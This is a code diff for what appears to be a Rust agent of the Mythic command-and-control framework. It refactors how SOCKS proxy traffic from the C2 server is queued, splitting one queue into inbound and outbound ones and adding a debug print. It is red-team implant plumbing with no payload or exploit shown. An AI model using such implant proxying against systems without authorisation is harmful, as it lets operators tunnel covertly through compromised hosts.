@@ -1,7 +1,7 @@
 use crate::payloadvars;
 use crate::tasking::Tasker;
 use crate::profiles::Profile;
-use crate::socks::{SocksMsg, SOCKS_QUEUE};
+use crate::socks::{SocksMsg, SOCKS_INBOUND_QUEUE, SOCKS_OUTBOUND_QUEUE};
 use chrono::prelude::{DateTime, Local, NaiveDate, NaiveDateTime, NaiveTime};
 use chrono::Duration;
 use rand::Rng;
@@ -155,16 +155,14 @@ impl Agent {
 
         let mut all_tasks: Vec<AgentTask> = Vec::new();
 
-        // Handle SOCKS messages from Mythic
+        // Handle SOCKS messages from Mythic - process directly instead of as tasks
         if let Some(socks_data) = response.socks {
             if !socks_data.is_empty() {
-                let socks_task = AgentTask {
-                    command: "socks_data".to_string(),
-                    parameters: serde_json::to_string(&socks_data)?,
-                    timestamp: 0.0,
-                    id: "socks_immediate".to_string(),
-                };
-                all_tasks.push(socks_task);
+                // Send SOCKS messages directly to the SOCKS thread via the inbound queue
+                if let Ok(mut queue) = SOCKS_INBOUND_QUEUE.lock() {
+                    queue.extend(socks_data);
+                    eprintln!("DEBUG: Added {} SOCKS messages to inbound queue", queue.len());
+                }
             }
         }
 
@@ -183,9 +181,9 @@ impl Agent {
         &mut self,
         completed: &[serde_json::Value],
     ) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
-        // Retrieve and clear SOCKS queue
+        // Retrieve and clear SOCKS outbound queue
         let socks_to_send = {
-            let mut q = SOCKS_QUEUE.lock().unwrap();
+            let mut q = SOCKS_OUTBOUND_QUEUE.lock().unwrap();
             let v = q.clone();
             q.clear();
             v
